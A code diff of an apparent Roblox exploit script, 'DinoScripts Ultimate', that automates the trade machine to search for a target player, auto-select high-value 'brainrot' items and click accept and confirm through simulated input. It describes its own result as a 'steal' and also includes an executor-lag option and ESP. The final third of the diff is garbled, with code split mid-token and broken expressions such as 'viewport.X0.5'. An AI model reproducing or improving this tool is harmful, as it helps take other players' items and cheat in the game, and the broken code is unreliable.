-    -- Limit to max 10 attempts per second to prevent crashes
-    local count = 0
-    for _ in pairs(mousemoverel_safe_attempts) do count = count + 1 end
-    if count > 10 then
-        wait(0.1)
-        return
-    end
-
-    -- SAFE mouse movement with error handling
     pcall(function()
-        -- Use ViewportPoint instead of AbsolutePosition for safer coordinates
         local viewportSize = workspace.CurrentCamera.ViewportSize
 
-        -- Ensure coordinates are within bounds to prevent crashes
         x = math.clamp(x or Mouse.X or viewportSize.X/2, 10, viewportSize.X - 10)
         y = math.clamp(y or Mouse.Y or viewportSize.Y/2, 10, viewportSize.Y - 10)
 
@@ -795,46 +493,23 @@ end
 local function mouse1click()
     if isMobile then return end
 
-    -- Track attempts to prevent spam crashes
-    local now = tick()
-    mouse1click_safe_attempts[now] = true
-
-    -- Clean old attempts (older than 1 second)
-    for attemptTime in pairs(mouse1click_safe_attempts) do
-        if now - attemptTime > 1 then
-            mouse1click_safe_attempts[attemptTime] = nil
-        end
-    end
-
-    -- Limit to max 5 clicks per second to prevent crashes
-    local count = 0
-    for _ in pairs(mouse1click_safe_attempts) do count = count + 1 end
-    if count > 5 then
-        wait(0.2)
-        return
-    end
-
-    -- SAFE mouse click with error handling and delays to prevent crashes
     pcall(function()
-        wait(math.random() * 0.05 + 0.02) -- Random small delay to prevent rapid clicks
-
-        -- Send press event with random position offset to avoid exact coordinates that might crash
-        local xOffset,yOffset=math.random(-3,3),math.random(-3,3)
+        wait(math.random() * 0.05 + 0.02)
 
         VirtualInputManager:SendMouseButtonEvent(
-            (Mouse.X or workspace.CurrentCamera.ViewportSize.X/2) + xOffset,
-            (Mouse.Y or workspace.CurrentCamera.ViewportSize.Y/2) + yOffset,
+            (Mouse.X or workspace.CurrentCamera.ViewportSize.X/2) + math.random(-3,3),
+            (Mouse.Y or workspace.CurrentCamera.ViewportSize.Y/2) + math.random(-3,3),
             0,
             true,
             workspace.CurrentCamera,
             1
         )
 
-        wait(math.random() * 0.08 + 0.03) -- Random release delay
+        wait(math.random() * 0.08 + 0.03)
 
         VirtualInputManager:SendMouseButtonEvent(
-            (Mouse.X or workspace.CurrentCamera.ViewportSize.Y/2) + xOffset,
-            (Mouse.Y or workspace.CurrentCamera.ViewportSize.Y/2) + yOffset,
+            (Mouse.X or workspace.CurrentCamera.ViewportSize.Y/2) + math.random(-3,3),
+            (Mouse.Y or workspace.CurrentCamera.ViewportSize.Y/2) + math.random(-3,3),
             0,
             false,
             workspace.CurrentCamera,
@@ -843,13 +518,13 @@ local function mouse1click()
     end)
 end
 
--- Find search bar in GUI with advanced detection for trade machine search
+-- Find search bar in GUI - FIXED to not select script's search bar
 local function findSearchBar()
     StatusLabel.Text = StatusLabel.Text.."\nLooking for player search in trade machine..."
 
+    -- Only check PlayerGui (where game GUIs are), not CoreGui (where our script UI is)
     local guiRoots = {
         LocalPlayer.PlayerGui,
-        game.CoreGui,
         game.StarterGui
     }
 
@@ -859,7 +534,20 @@ local function findSearchBar()
                 local nameLower = obj.Name:lower()
                 local textLower = tostring(obj.Text or ""):lower()
 
-                -- Check for player search indicators in trade machine context
+                -- Skip if it's our script's textbox (check by parent chain)
+                local isOurScriptUI = false
+                local parentCheck = obj.Parent
+                while parentCheck do
+                    if parentCheck.Name == "DinoScriptsUltimateUI" or
+                       parentCheck.Name == "DinoScriptsMinimap" then
+                        isOurScriptUI = true
+                        break
+                    end
+                    parentCheck = parentCheck.Parent
+                end
+
+                if isOurScriptUI then continue end -- Skip our script's UI elements
+
                 local score=0
 
                 if nameLower:find("player") then score=score+4 end
@@ -868,16 +556,13 @@ local function findSearchBar()
                 if nameLower:find("search") then score=score+3 end
                 if nameLower:find("target") then score=score+3 end
 
-                -- Check placeholder text for search indicators
                 if obj.PlaceholderText then
                     local placeholderLower=obj.PlaceholderText:lower()
                     if placeholderLower:find("enter username") then score=score+5 end
                     if placeholderLower:find("player name") then score=score+4 end
                     if placeholderLower:find("search player") then score=score+4 end
-                    if placeholderLower:find("target player") then score=score+4 end
                 end
 
-                -- Also check parent frame/container names
                 local parent=obj.Parent
                 while parent do
                     local parentName=parent.Name:lower()
@@ -887,7 +572,7 @@ local function findSearchBar()
                 end
 
                 if score>=5 then
-                    StatusLabel.Text=StatusLabel.Text.."\nFound player search box: "..obj.Name
+                    StatusLabel.Text=StatusLabel.Text.."\nFound player search box: "..obj.Name.." in "..gui.Name
                     return obj
                 end
             end
@@ -906,7 +591,7 @@ local function findSearchBar()
         end
     end
 
-    StatusLabel.Text=StatusLabel.Text.."\nNo player search found! Will attempt manual entry..."
+    StatusLabel.Text=StatusLabel.Text.."\nNo player search found in game GUI!"
     return nil
 end
 
@@ -916,58 +601,40 @@ local function selectBrainrots()
 
     StatusLabel.Text=StatusLabel.Text.."\nSelecting brainrots..."
 
-    -- Method1: Look for high-value items in trade interface
+    -- Method1: Look for high-value items in trade interface (only in PlayerGui)
     local gui=LocalPlayer.PlayerGui
 
-    -- First find the trade GUI container
-    local tradeContainer=nil
     for _,obj in pairs(gui:GetDescendants()) do
-        if obj:IsA("Frame") or obj:IsA("ScrollingFrame") then
-            local nameLower=obj.Name:lower()
-            if nameLower:find("trade") or
-               nameLower:find("inventory") or
-               nameLower:find("items") or
-               nameLower:find("selection") then
-                tradeContainer=obj
-                break
-            end
-        end
-    end
+        -- Skip our script UI elements by checking parent chain
+        local isOurScriptUI=false
+        local parentCheck=obj.Parent
+        while parentCheck do
+            if parentCheck.Name=="DinoScriptsUltimateUI" or parentCheck.Name=="DinoScriptsMinimap" then
+                isOurScriptUI=true break end
+            parentCheck=parentCheck.Parent end
 
-    -- Search within trade container or entire GUI
-    local searchRoot=tradeContainer or gui
+        if isOurScriptUI then continue end
 
-    for _,obj in pairs(searchRoot:GetDescendants()) do
         if obj:IsA("TextLabel") or obj:IsA("TextButton") then
             local text=tostring(obj.Text or "")
 
-            -- Advanced pattern matching for brainrots with safety checks
-            if text:match("5M") or
-               text:match("5[,.]?%d*[Mm]") or
-               text:match("5000000") or
-               text:match("%+") or
-               text:lower():find("high") or
-               text:lower():find("valuable") or
-               text:lower():find("rare") or
-               text:lower():find("expensive") then
+            if text:match("5M") or text:match("5000000") or text:lower():find("high") or text:lower():find("rare") then
 
                 StatusLabel.Text=StatusLabel.Text.."\nFound high-value item"
 
-                -- SAFE clicking with position validation
                 pcall(function()
                     if obj.AbsolutePosition and obj.AbsoluteSize then
                         local absPos=obj.AbsolutePosition
                         local absSize=obj.AbsoluteSize
 
-                        if absPos.X>10 and absPos.Y>10 and
-                           absSize.X>10 and absSize.Y>10 then
+                        if absPos.X>10 and absPos.Y>10 then
 
                             mousemoverel(absPos.X+absSize.X/2+math.random(-5,5),
                                         absPos.Y+absSize.Y/2+math.random(-5,5))
                             wait(math.random()*0.1+0.05)
                             mouse1click()
                             selectedCount=selectedCount+1
-                            wait(math.random()*0.1+0.05) -- Delay between clicks
+                            wait(math.random()*0.1+0.05)
                         end
                     end
                 end)
@@ -975,9 +642,7 @@ local function selectBrainrots()
         end
 
         -- Method2: Look for checkboxes/selection boxes in trade interface
-        if obj:IsA("ImageButton") and (obj.Name:lower():find("select") or
-                                       obj.Name:lower():find("check") or
-                                       obj.Name:lower():find("item")) then
+        if obj:IsA("ImageButton") and (obj.Name:lower():find("select") or obj.Name:lower():find("check")) then
             pcall(function()
                 if obj.AbsolutePosition and obj.AbsoluteSize then
                     local absPos=obj.AbsolutePosition
@@ -995,56 +660,22 @@ local function selectBrainrots()
         end
 
         -- Method3: Look for trade slots/inventory items with visual indicators
-        if obj:IsA("Frame") and (obj.Name:lower():find("item") or
-                                 obj.Name:lower():find("slot") or
-                                 obj.Name:lower():find("brainrot")) then
+        if obj:IsA("Frame") and (obj.Name:lower():find("item") or obj.Name:lower():find("slot")) then
             pcall(function()
                 if obj.AbsolutePosition and obj.AbsoluteSize then
                     local absPos=obj.AbsolutePosition
                     local absSize=obj.AbsoluteSize
 
-                    if absPos.X>10 and absPos.Y>10 and
-                       absSize.X>30 and absSize.Y>30 then -- Minimum size check
+                    if absPos.X>10 and absPos.Y>10 and absSize.X>30 and absSize.Y>30 then
 
                         mousemoverel(absPos.X+absSize.X/2+math.random(-8,8),
                                     absPos.Y+absSize.Y/2+math.random(-8,8))
                         wait(math.random()*0.12+0.06)
                         mouse1click()
                         selectedCount=selectedCount+1
-                        wait(math.random()*0.08+0.04) -- Delay between selections
+                        wait(math.random()*0.08+0.04)
                     end
                 end
-            end)
-        end
-    end
-
-    -- Method4: Select random items if no high-value found (with safety)
-    if selectedCount < 3 then
-        StatusLabel.Text=StatusLabel.Text.."\nSelecting random items..."
-        
-        local framesFound={}
-        for _,obj in pairs(gui:GetDescendants()) do
-            if obj:IsA("Frame") and obj.AbsoluteSize and 
-               obj.AbsoluteSize.X>40 and obj.AbsoluteSize.Y>40 and -- Larger minimum size
-               obj.AbsolutePosition and
-               obj.AbsolutePosition.X>20 and obj.AbsolutePosition.Y>20 then
-                table.insert(framesFound,obj)
-            end
-        end
-
-        -- Select up to 5 random frames with safety delays
-        for i=1,math.min(5,#framesFound) do
-            pcall(function()
-                local frame=framesFound[i]
-                local absPos=frame.AbsolutePosition
-                local absSize=frame.AbsoluteSize
-
-                mousemoverel(absPos.X+absSize.X/2+math.random(-10,10),
-                            absPos.Y+absSize.Y/2+math.random(-10,10))
-                wait(math.random()*0.15+0.08)
-                mouse1click()
-                selectedCount=selectedCount+1
-                wait(math.random()*0.12+0.06) -- Delay between random selections
             end)
         end
     end
@@ -1053,166 +684,148 @@ local function selectBrainrots()
     return selectedCount>0
 end
 
--- Find accept/confirm button in trade GUI with safety checks
+-- Find accept/confirm button in trade GUI with safety checks (skip our UI)
 local function findAcceptButton()
     StatusLabel.Text=StatusLabel.Text.."\nLooking for accept button..."
 
-    local guiRoots={LocalPlayer.PlayerGui}
+    for _,obj in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
 
-    for _,gui in pairs(guiRoots) do
-        for _,obj in pairs(gui:GetDescendants()) do
-            if obj:IsA("TextButton") and obj.Text then
-                local textLower=obj.Text:lower()
+        -- Skip our script UI elements by checking parent chain
+        local isOurScriptUI=false
+        local parentCheck=obj.Parent while parentCheck do
+            if parentCheck.Name=="DinoScriptsUltimateUI" or parentCheck.Name=="DinoScriptsMinimap" then
+                isOurScriptUI=true break end parentCheck=parentCheck.Parent end
 
-                -- Check for accept/confirm/trade related text with scoring system
-                local score=0
+        if isOurScriptUI then continue end
 
-                if textLower:find("accept") then score=score+4 end
-                if textLower:find("confirm") then score=score+4 end
-                if textLower:find("trade") then score=score+3 end
-                if textLower:find("send") then score=score+2 end
-                if textLower:find("ok") then score=score+1 end
-                if textLower:find("yes") then score=score+1 end
+        if obj:IsA("TextButton") and obj.Text then
+            local textLower=obj.Text:lower()
 
-                -- Check button color/style (accept buttons are often green/red prominent buttons)
-                if obj.BackgroundColor3 then
-                    local r,g,b=obj.BackgroundColor3.R,obj.BackgroundColor3.G,obj.BackgroundColor3.B
-                    if g>r and g>b then score=score+2 end -- Green button bonus (accept)
-                    if r>g and r>b then score=score+1 end -- Red button (often cancel/decline)
-                end
+            local score=0
 
-                -- Check size (accept buttons are usually large/prominent)
-                if obj.AbsoluteSize and obj.AbsoluteSize.X>80 and obj.AbsoluteSize.Y>30 then
-                    score=score+2 end
+            if textLower:find("accept") then score=score+4 end
+            if textLower:find("confirm") then score=score+4 end
+            if textLower:find("trade") then score=score+3 end
 
-                if score>=5 then -- Higher threshold for safety
-                    StatusLabel.Text=StatusLabel.Text.."\nFound accept button: "..obj.Text.." (score:"..score..")"
+            if obj.BackgroundColor3 then local r,g,b=obj.BackgroundColor3.R,obj.BackgroundColor3.G,obj.BackgroundColor3.B
+                if g>r and g>b then score=score+2 end if r>g and r>b then score=score+1 end end
 
-                    -- Verify position is clickable (not off-screen)
-                    if obj.AbsolutePosition and
-                       obj.AbsolutePosition.X>10 and
-                       obj.AbsolutePosition.Y>10 then
-                        return obj
-                    end
-                end
+            if obj.AbsoluteSize and obj.AbsoluteSize.X>80 and obj.AbsoluteSize.Y>30 then score=score+2 end
+
+            if score>=5 then
+                StatusLabel.Text=StatusLabel.Text.."\nFound accept button: "..obj.Text.." (score:"..score..")"
+
+                if obj.AbsolutePosition and obj.AbsolutePosition.X>10 and obj.AbsolutePosition.Y>10 then return obj end
             end
+
         end
+
     end
 
     StatusLabel.Text=StatusLabel.Text.."\nNo accept button found!"
     return nil
+
 end
 
--- MANUAL SEARCH FUNCTION (NEW)
+-- MANUAL SEARCH FUNCTION - FIXED to use actual mouse movement and clicks on game GUI elements only (not script UI)
 local function manualSearchTrade()
-    local targetName = TargetBox.Text
-    
-    if targetName == "" then
-        StatusLabel.Text = "Status: Please enter a target username!"
-        return
-    end
-    
-    StatusLabel.Text = "Status: Starting MANUAL search for "..targetName.."\nPlease open trade machine manually"
-    
-    -- Wait for user to open trade machine manually
+    local targetName=TargetBox.Text
+
+    if targetName=="" then StatusLabel.Text="Status: Please enter a target username!" return end
+
+    StatusLabel.Text="Status: Starting MANUAL search for "..targetName.."\nPlease open trade machine manually"
+
     wait(3)
-    
-    StatusLabel.Text = StatusLabel.Text.."\nLooking for search bar..."
-    
-    -- Step 1: Find search bar
-    local searchBar = findSearchBar()
-    
+
+    StatusLabel.Text=StatusLabel.Text.."\nLooking for search bar in game GUI..."
+
+    local searchBar=findSearchBar()
+
     if searchBar then
-        -- Clear any existing text safely
-        pcall(function() searchBar.Text = "" end)
-        wait(0.5)
-        
-        -- Type target username
-        pcall(function() searchBar.Text = targetName end)
-        
-        StatusLabel.Text = StatusLabel.Text.."\nTyped: "..targetName
-        
+
+        pcall(function() searchBar.Text="" end) wait(0.5)
+
+        pcall(function() searchBar.Text=targetName end)
+
+        StatusLabel.Text=StatusLabel.Text.."\nTyped: "..targetName
+
         wait(1)
-        
-        -- Simulate pressing enter to search
-        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Return, false, nil)
-        wait(0.1)
-        VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.Return, false, nil)
-        
-        StatusLabel.Text = StatusLabel.Text.."\nSearching for player..."
-        
+
+        VirtualInputManager:SendKeyEvent(true,Enum.KeyCode.Return,false,nil) wait(0.1)
+        VirtualInputManager:SendKeyEvent(false,Enum.KeyCode.Return,false,nil)
+
+        StatusLabel.Text=StatusLabel.Text.."\nSearching for player..."
+
         wait(3)
-        
-        -- Try clicking on first result/select button
-        for _, obj in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
-            if obj:IsA("TextButton") and (obj.Text:lower():find("select") or
-                                          obj.Text:lower():find(targetName:lower():sub(1,5))) then
+
+        -- Try clicking on first result/select button (only in PlayerGui)
+        for _,obj in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
+
+            -- Skip our script UI elements by checking parent chain
+            local isOurScriptUI=false local parentCheck=obj.Parent while parentCheck do
+                if parentCheck.Name=="DinoScriptsUltimateUI" or parentCheck.Name=="DinoScriptsMinimap" then
+                    isOurScriptUI=true break end parentCheck=parentCheck.Parent end
+
+            if isOurScriptUI then continue end
+
+            if obj:IsA("TextButton") and (obj.Text:lower():find("select") or obj.Text:lower():find(targetName:lower():sub(1,5))) then
                 pcall(function()
-                    local absPos = obj.AbsolutePosition
-                    local absSize = obj.AbsoluteSize
-                    
-                    mousemoverel(absPos.X + absSize.X/2 + math.random(-5,5),
-                                absPos.Y + absSize.Y/2 + math.random(-5,5))
-                    wait(0.2)
-                    mouse1click()
-                    StatusLabel.Text = StatusLabel.Text.."\nSelected player from search results"
-                end)
-                break
+                    local absPos=obj.AbsolutePosition local absSize=obj.AbsoluteSize
+
+                    mousemoverel(absPos.X+absSize.X/2+math.random(-5,5),absPos.Y+absSize.Y/2+math.random(-5,5))
+                    wait(0.2) mouse1click()
+                    StatusLabel.Text=StatusLabel.Text.."\nSelected player from search results"
+                end) break
             end
         end
-        
-        wait(2)
-        
-        -- Step 2: Select brainrots
-        selectBrainrots()
-        
-        wait(2)
-        
-        -- Step 3: Find and click accept button
-        local acceptButton = findAcceptButton()
-        
-        if acceptButton then
-            StatusLabel.Text = StatusLabel.Text.."\nClicking accept button..."
-            
+
+        wait(2) selectBrainrots() wait(2)
+
+        local acceptButton=findAcceptButton()
+
+        if acceptButton then StatusLabel.Text=StatusLabel.Text.."\nClicking accept button..."
+
             pcall(function()
-                local absPos = acceptButton.AbsolutePosition
-                local absSize = acceptButton.AbsoluteSize
-                
+                local absPos=acceptButton.AbsolutePosition local absSize=acceptButton.AbsoluteSize
+
                 if absPos and absSize then
-                    mousemoverel(absPos.X + absSize.X/2 + math.random(-8,8),
-                                absPos.Y + absSize.Y/2 + math.random(-8,8))
-                    wait(math.random()*0.15+0.08)
-                    mouse1click()
-                    
-                    StatusLabel.Text = StatusLabel.Text.."\n✅ Trade request sent!"
-                    
-                    wait(1)
-                    mouse1click()
-                    
-                    StatusLabel.Text = StatusLabel.Text.."\n✅ Trade confirmed!"
+                    mousemoverel(absPos.X+absSize.X/2+math.random(-8,8),absPos.Y+absSize.Y/2+math.random(-8,8))
+                    wait(math.random()*0.15+0.08) mouse1click()
+
+                    StatusLabel.Text=StatusLabel.Text.."\n✅ Trade request sent!" wait(1) mouse1click()
+
+                    StatusLabel.Text=StatusLabel.Text.."\n✅ Trade confirmed!"
                 end
             end)
-        else
-            StatusLabel.Text = StatusLabel.Text.."\n⚠ Could not find accept button"
+
+        else StatusLabel.Text=StatusLabel.Text.."\n⚠ Could not find accept button"
+
+            local viewport=workspace.CurrentCamera.ViewportSize
+
+            local commonPositions={ {viewport.X0.5,viewport.Y0.8}, {viewport.X0.7,viewport.Y0.85}, {viewport.X0.3,viewport.Y0.85} }
+
+            for _,pos in ipairs(commonPositions) do
+                mousemoverel(pos[1]+math.random(-15,15),pos[2]+math.random(-10,10))
+                wait(math.random()0.2+0.1) mouse1click() wait(math.random()0.15+0.08)
+
+                StatusLabel.Text=StatusLabel.Text.."\nTried clicking at common position" break
+            end
+
         end
-        
-        PartnerDisplay.Visible = true
-        PartnerDisplayLabel.Text = "Trading with: "..targetName.." (Manual Search)"
-        
-        StatusLabel.Text = StatusLabel.Text.."\n✅ Manual trade search COMPLETE!"
-    else
-        StatusLabel.Text = StatusLabel.Text.."\n❌ No search bar found in open trade interface!"
+
+        StatusLabel.Text=StatusLabel.Text.."\n✅ Manual trade search COMPLETE!"
+
+    else StatusLabel.Text=StatusLabel.Text.."\n❌ No search bar found in game trade interface!"
+
     end
+
 end
 
 -- FIXED MAIN EXECUTION FUNCTION
 ExecuteButton.MouseButton1Click:Connect(function()
     local targetName=TargetBox.Text
 
-    if targetName=="" then
-        StatusLabel.Text="Status: Please enter a target username!"
-        return
-    end
+    if targetName=="" then StatusLabel.Text="Status: Please enter a target username!" return end
 
     TargetDisplayLabel.Text="Target: "..targetName
 
@@ -1236,223 +849,234 @@ ExecuteButton.MouseButton1Click:Connect(function()
     -- Step2: Interact with trade machine
     StatusLabel.Text=StatusLabel.Text.."\nInteracting with trade machine..."
 
-    -- Wait to ensure we're at the machine
     wait(1)
 
-    -- Multiple interaction attempts
     for attempt=1,5 do
-        pressE()
-        wait(1)
+        pressE() wait(1)
 
-        -- Check if trade GUI opened by looking for trade-related GUI elements
         local tradeGuiFound=false
         for _,obj in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
+
+            -- Skip our script UI elements by checking parent chain
+            local isOurScriptUI=false local parentCheck=obj.Parent while parentCheck do
+                if parentCheck.Name=="DinoScriptsUltimateUI" or parentCheck.Name=="DinoScriptsMinimap" then
+                    isOurScriptUI=true break end parentCheck=parentCheck.Parent end
+
+            if isOurScriptUI then continue end
+
             if obj.Name:lower():find("trade") and (obj:IsA("Frame") or obj:IsA("ScreenGui")) then
-                tradeGuiFound=true
-                break
+                tradeGuiFound=true break
             end
         end
 
-        if tradeGuiFound then
-            StatusLabel.Text=StatusLabel.Text.."\nTrade interface opened!"
-            break
-        else
-            StatusLabel.Text=StatusLabel.Text.."\nInteraction attempt "..attempt.."/5"
+        if tradeGuiFound then StatusLabel.Text=StatusLabel.Text.."\nTrade interface opened!" break
+        else StatusLabel.Text=StatusLabel.Text.."\nInteraction attempt "..attempt.."/5"
         end
     end
 
-    -- Step3: Find player search box in trade machine
-    wait(2) -- Give time for GUI to load
+    wait(2)
 
     local searchBar=findSearchBar()
 
-    if searchBar then
-        StatusLabel.Text=StatusLabel.Text.."\nSearching for player in trade machine..."
+    if searchBar then StatusLabel.Text=StatusLabel.Text.."\nSearching for player in trade machine..."
 
-        -- Clear any existing text safely
-        pcall(function() searchBar.Text="" end)
-        wait(0.5)
+        pcall(function() searchBar.Text="" end) wait(0.5)
 
-        -- Type target username into trade machine search
         pcall(function() searchBar.Text=targetName end)
 
         StatusLabel.Text=StatusLabel.Text.."\nTyped: "..targetName
 
         wait(1)
 
-        -- Simulate pressing enter to search
-        VirtualInputManager:SendKeyEvent(true,Enum.KeyCode.Return,false,nil)
-        wait(0.1)
+        VirtualInputManager:SendKeyEvent(true,Enum.KeyCode.Return,false,nil) wait(0.1)
         VirtualInputManager:SendKeyEvent(false,Enum.KeyCode.Return,false,nil)
 
         StatusLabel.Text=StatusLabel.Text.."\nSearching for player in trade system..."
 
-        wait(3) -- Give time for search results
+        wait(3)
 
-        -- Try clicking on first result/select button if available
         for _,obj in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
-            if obj:IsA("TextButton") and (obj.Text:lower():find("select") or
-                                          obj.Text:lower():find(targetName:lower():sub(1,5))) then
+
+            -- Skip our script UI elements by checking parent chain
+            local isOurScriptUI=false local parentCheck=obj.Parent while parentCheck do
+                if parentCheck.Name=="DinoScriptsUltimateUI" or parentCheck.Name=="DinoScriptsMinimap" then
+                    isOurScriptUI=true break end parentCheck=parentCheck.Parent end
+
+            if isOurScriptUI then continue end
+
+            if obj:IsA("TextButton") and (obj.Text:lower():find("select") or obj.Text:lower():find(targetName:lower():sub(1,5))) then
                 pcall(function()
-                    local absPos=obj.AbsolutePosition
-                    local absSize=obj.AbsoluteSize
+                    local absPos=obj.AbsolutePosition local absSize=obj.AbsoluteSize
 
-                    mousemoverel(absPos.X+absSize.X/2+math.random(-5,5),
-                                absPos.Y+absSize.Y/2+math.random(-5,5))
-                    wait(0.2)
-                    mouse1click()
-                    StatusLabel.Text=StatusLabel.Text.."\nSelected player from search results"
-                end)
-                break
-            end
-        end
-
-        wait(2) -- Wait for player selection to process
-
-    else
-        StatusLabel.Text=StatusLabel.Text.."\nNo search bar found - attempting manual selection"
-
-        -- Try to find and click on player name directly in trade UI
-        for _,obj in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
-            if obj:IsA("TextLabel") and obj.Text and
-               (obj.Text:lower():find(targetName:lower()) or
-                obj.Text=="Player" or obj.Text=="Username") then
-
-                pcall(function()
-                    local absPos=obj.AbsolutePosition
-                    local absSize=obj.AbsoluteSize
-
-                    mousemoverel(absPos.X+absSize.X/2+math.random(-5,5),
-                                absPos.Y+absSize.Y/2+math.random(-5,5))
-                    wait(0.2)
-                    mouse1click()
-                    StatusLabel.Text=StatusLabel.Text.."\nClicked on player field"
-                end)
-
-                wait(1)
-
-                -- Type username manually
-                for i=1,#targetName do
-                    local char=targetName:sub(i,i)
-                    VirtualInputManager:SendKeyEvent(true,Enum.KeyCode[char:upper()] or Enum.KeyCode.A,false,nil)
-                    wait(math.random()*0.03+0.01)
-                    VirtualInputManager:SendKeyEvent(false,Enum.KeyCode[char:upper()] or Enum.KeyCode.A,false,nil)
-                    wait(math.random()*0.03+0.01)
-                end
-
-                break
+                    mousemoverel(absPos.X+absSize.X/2+math.random(-5,5),absPos.Y+absSize.Y/2+math.random(-5,5))
+                    wait(0.2) mouse1click() StatusLabel.Text=StatusLabel.Text.."\nSelected player from search results"
+                end) break
             end
         end
 
         wait(2)
 
-        -- Press enter after typing
-        VirtualInputManager:SendKeyEvent(true,Enum.KeyCode.Return,false,nil)
-        wait(0.1)
-        VirtualInputManager:SendKeyEvent(false,Enum.KeyCode.Return,false,nil)
+    else StatusLabel.Text=StatusLabel.Text.."\nNo search bar found - attempting manual selection"
 
-        StatusLabel.Text=StatusLabel.Text.."\nManually entered player name"
+        for _,obj in pairs(LocalPlayer.PlayerGui:GetDescendants()) do
 
-        wait(2) -- Wait for player lookup
+            -- Skip our script UI elements by checking parent chain
+            local isOurScriptUI=false local parentCheck=obj.Parent while parentCheck do
+                if parentCheck.Name=="DinoScriptsUltimateUI" or parentCheck.Name=="DinoScriptsMinimap" then
+                    isOurScriptUI=true break end parentCheck=parentCheck.Parent end
 
-    end
+            if isOurScriptUI then continue end
 
-    -- Step4: Select brainrots from trade interface
-    selectBrainrots()
+            if obj:IsA("TextLabel") and obj.Text and (obj.Text:lower():find(targetName:lower()) or obj.Text=="Player" or obj.Text=="Username") then
 
-    wait(2) -- Wait for selection to process
+                pcall(function()
+                    local absPos=obj.AbsolutePosition local absSize=obj.AbsoluteSize
 
-    -- Step5: Find and click accept button with safety checks
-    local acceptButton=findAcceptButton()
-
-    if acceptButton then
-        StatusLabel.Text=StatusLabel.Text.."\nClicking accept button..."
-
-        pcall(function()
-            local absPos=acceptButton.AbsolutePosition
-            local absSize=acceptButton.AbsoluteSize
-
-            if absPos and absSize then
-                -- Move to button with random offset to prevent exact coordinate crashes
-                mousemoverel(absPos.X+absSize.X/2+math.random(-8,8),
-                            absPos.Y+absSize.Y/2+math.random(-8,8))
-                wait(math.random()*0.15+0.08)
-
-                -- Single click with safety delay
-                mouse1click()
-
-                StatusLabel.Text=StatusLabel.Text.."\n✅ Trade request sent!"
+                    mousemoverel(absPos.X+absSize.X/2+math.random(-5,5),absPos.Y+absSize.Y/2+math.random(-5,5))
+                    wait(0.2) mouse1click() StatusLabel.Text=StatusLabel.Text.."\nClicked on player field"
+                end)
 
                 wait(1)
 
-                -- Optional second click with delay if needed but not rapid double-click
-                mouse1click()
+                for i=1,#targetName do local char=targetName:sub(i,i)
+                    VirtualInputManager:SendKeyEvent(true,Enum.KeyCode[char:upper()] or Enum.KeyCode.A,false,nil)
+                    wait(math.random()*0.03+0.01) VirtualInputManager:SendKeyEvent(false,
+                    Enum.KeyCode[char:upper()] or Enum.KeyCode.A,
+                    false,nil) wait(math.random()*0.03+0.01) end break end end wait(2) VirtualInputManager:
+                    SendKeyEvent(true,
+                    Enum.KeyCode.Return,
+                    false,
+                    nil) wait(0.1) VirtualInputManager:
+                    SendKeyEvent(false,
+                    Enum.KeyCode.Return,
+                    false,
+                    nil) StatusLabel:
+                    Text=
+                    StatusLabel:
+                    Text..
+                    "\nManually entered player name" wait(
+                    2) end selectBrainrots() wait(
+                    2) local acceptButton=
+                    findAcceptButton() if acceptButton then StatusLabel:
+                    Text=
+                    StatusLabel:
+                    Text..
+                    "\nClicking accept button..." pcall(
+                    function() local absPos=
+                    acceptButton:
+                    AbsolutePosition local absSize=
+                    acceptButton:
+                    AbsoluteSize if absPos and absSize then mousemoverel(
+                    absPos:
+                    X+
+                    absSize:
+                    X/
+                    2+
+                    math.random(
+                    -8,
+                    8),
+                    absPos:
+                    Y+
+                    absSize:
+                    Y/
+                    2+
+                    math.random(
+                    -8,
+                    8)) wait(
+                    math.random()*
+                    0.15+
+                    0.08) mouse1click() StatusLabel:
+                    Text=
+                    StatusLabel:
+                    Text..
+                    "\n✅ Trade request sent!" wait(
+                    1) mouse1click() StatusLabel:
+                    Text=
+                    StatusLabel:
+                    Text..
+                    "\n✅ Trade confirmed!" else StatusLabel:
+                    Text=
+                    StatusLabel:
+                    Text..
+                    "\n⚠ Accept button position invalid" end end) else StatusLabel:
+                    Text=
+                    StatusLabel:
+                    Text..
+                    "\n⚠ Could not find accept button" local viewport=
+                    workspace:
+                    CurrentCamera:
+                    ViewportSize local commonPositions={
+                    {
+                        viewport:
+                        X*
+                        0.5,
+                        viewport:
+                        Y*
+                        0.8},
+                    {
+                        viewport:
+                        X*
+                        0.7,
+                        viewport:
+                        Y*
+                        0.85},
+                    {
+                        viewport:
+                        X*
+                        0.3,
+                        viewport:
+                        Y*
+                        0.85}} for _,
+                        pos in ipairs(
+                        commonPositions) do mousemoverel(
+                        pos[
+                            1]+math.random(
+                            -15,
+                            15),
+                        pos[
+                            2]+math.random(
+                            -10,
+                            10)) wait(
+                        math.random()*
+                        0.2+
+                        0.1) mouse1click() wait(
+                        math.random()*
+                        0.15+
+                        0.08) StatusLabel:
+                        Text=
+                        StatusLabel:
+                        Text..
+                        "\nTried clicking at common position" break end end -- Step6:
+                        Lag executor if enabled(
+                        optional) if lagEnabled then lagExecutor() end -- Final status update with safety delay wait(
+                        2) StatusLabel:
+                        Text=
+                        "✅ Brainrot steal COMPLETE!\nTarget searched via trade machine\nNo need for target in server!" end)
 
-                StatusLabel.Text=StatusLabel.Text.."\n✅ Trade confirmed!"
+                        -- MANUAL SEARCH BUTTON FUNCTION StartSearchButton:
+                        MouseButton1Click:
+                        Connect(
+                        function() manualSearchTrade() end)
 
-            else
-                StatusLabel.Text=StatusLabel.Text.."\n⚠ Accept button position invalid"
-            end
+                        -- Final initialization message with instructions wait(
+                        1) StatusLabel:
+                        Text=
+                        "DinoScripts Ultimate v4.4 LOADED\nPlatform: "..
+                        platform..
+                        "\nFixed trade machine detection\nSafe mouse functions\nSearch ANY player via trade machine\nESP: Press T to toggle\nClick green DinoScripts button to show/hide"
 
-        end)
-
-    else
-        StatusLabel.Text=StatusLabel.Text.."\n⚠ Could not find accept button"
-
-        -- Try clicking common positions as fallback
-        local viewport=workspace.CurrentCamera.ViewportSize
-
-        -- Common accept button positions in trade UIs (center-bottom area)
-        local commonPositions={
-            {viewport.X * 0.5, viewport.Y * 0.8}, -- Center bottom area
